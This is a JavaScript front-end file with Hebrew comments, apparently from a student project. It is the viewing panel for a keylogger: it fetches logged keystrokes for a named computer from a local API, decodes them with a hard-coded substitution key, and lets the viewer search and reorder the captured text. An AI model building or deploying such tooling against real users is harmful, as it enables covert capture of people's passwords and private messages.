//  משתנים המחזיקים רשימה מסודרת של כל האותיות מספרים וסמלים ואת המפתח של ההצפנה שמכיל רשימה כזו מעורבבת

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ".split("");
const nambers = "0123456789".split("")
const punctuation = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

const allCharacters = [...punctuation, ...nambers, ...letters];
const key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*', 'L', 'f', '7', 'g', '$', '!', 'V', '_', 'Z', 'O', 'X', '1', 'k', '?', '(', '\\', 'N', ':', 'e', 'p', '>', '`', 'h', '^', 'I', '#', 'a', 'Y', '"', 'l', 'Q', '[', ' ', 'C', 'J', '+', 'T', 's', '/', 'i', 't', 'S', ']', 'w', 'u', ')', 'A', 'F', '{', ',', '8', 'R', '2', '.', 'o', 'b', 'r', "'", '%', 'c', '&', 'D', ';', '<', '9', '4', 'd', 'z', '|', 'y', '}', 'j', 'G', '6', 'M', '~', 'v', 'B', 'W', 'q', 'K']

//   computer משתנה המחזיק את הפרמטר הנשלח ב 
const urlparams =  new URLSearchParams(window.location.search)
const computer = urlparams.get("computer")


//  מכניס את הפרמטר לכותרת
const h1 = document.getElementById("h1")
h1.textContent = computer

// בקשת מידע מהשרת - כל המידע הקיים על המחשב שנשלח כפרמטר 
const request = () => {


    fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
        response => response.json().then(
            object => {
                //  object מקבל את התוכן בתוך אובייקט למשתנה 
                console.log(object)
                if (response.status == 200){
                    //  object אם התקבל מידע עובר בלולאה על הרשימה שבתוך האובייקט דאטה  שבתוך 
                    object.data.forEach(item => {
                        // שמכיל את כל התוכן המפוענח div שולח את התוכן המילולי לפענוח שמחזיר אלמנט 
                        const decrypted = deciphering(item.encrypted_words)
                        // עם התוכן div יוצר אלמנט כותרת עם קלאס המיועד לעצוב שלו ומכניס אליו את האלמנט 
                        const new_element = document.createElement("h3")
                        new_element.setAttribute('class', 'the_data')
                        new_element.appendChild(decrypted)
                        // bodyמכניס את הכותרת שנוצרה לתוך ה
                        document.body.appendChild(new_element)
                
                        }
                    );
                // אם השרת מחזיר שגיאה
                }else{
                    console.log(object)
                    throw new Error(response.status)
                    return object
                }
            }
        )
    )
}

// חדש בצורה מסודרת div פונקציה שמפענחת את הטקסט ומכניסה אותו לאלמנט 
const deciphering = (text) => {
    let new_d = document.createElement("div")
    let new_p = document.createElement("p")
    // משתנה לטקסט המפוענח
    let decrypted = ""
    //  לולאה המפענחת אות אות
    for (let i = 0; i < text.length; i++){
        let char = allCharacters[key.indexOf(text[i])]
        // אם התו קיים ברשימה אנו מפענחים אותו
        if (char != undefined){
            decrypted += char
        }else{
            // נוסף p ונוצר  div והוא נכנס ל p מכניסים את התוכן לאלמנט  \n אם התו הוא 
            if (text[i] == "\n"){
            new_p.textContent += decrypted
            new_d.appendChild(new_p)
            new_p = document.createElement("p")
            decrypted = ""
            //  אם התו חריג ולא קיים ברשימה - מה שאומר שלא הוצפן מלכתחילה הוא משורשר כמות שהוא
            }else{
                decrypted += text[i]
            }
        }
    }
    // האלמנט השלם 
    console.log(decrypted)
    return new_d
}

// פונקציית חיפוש לפי טקסט
const search = () => {
    const text = document.getElementById("text").value.trim();
    console.log(text)
    // שמכילים את התוכן h3 ניגש לכל האלמנטים  
    const allelemenets = document.querySelectorAll("h3");
    console.log(allelemenets)
    // עובר בלולאה על כל אלמנט כזה
    for (let i = 0; i < allelemenets.length; i ++){
        let element_h3 = allelemenets[i];
        console.log(element_h3);
        // h3ניגש לכל האלמנטים של השורות שבתוך ה 
        let paragraphs = element_h3.getElementsByTagName("p");
        let faund = false
        // faund עובר על כל אחד ובודק אם הוא מכיל את הטקסט הרצוי אם כן מסמן זאת במשתנה 
        for (let j = 0; j < paragraphs.length; j ++){
            if (paragraphs[j].textContent.includes(text)){
                faund = true;
                break;
            }
        }
        console.log(faund)
        // מה שאומר שהטקסט הרצוי לא קיים במאפיין, מוחק את המאפיין הזה false הוא faund אם  
        if (!faund){
            element_h3.remove()
        }
    }
}

// פונקציה להפוך את סדר הטקסט בדף מהסוף להתחלה 
const reverse_data = () => {
    // שמכילים את התוכן h3 ניגש לכל האלמנטים   
    const allelemenets = document.querySelectorAll("h3")
    // מכניס אותם לרשימה
    const arr_h3 = Array.from(allelemenets)
    // הופך את הסדר של האיברים ברשימה
    arr_h3.reverse()
    console.log(arr_h3)
    // עובר על הרשימה בלולאה ומכניס לדף את כל המאפיינים מהאחרון עד הראשון
    arr_h3.forEach(e_h3 => {
        document.body.appendChild(e_h3)
    }
    )
}

request()
const link_search = document.getElementById("mylink")
link_search.addEventListener("click", () => {
    event.preventDefault();
    search()
})


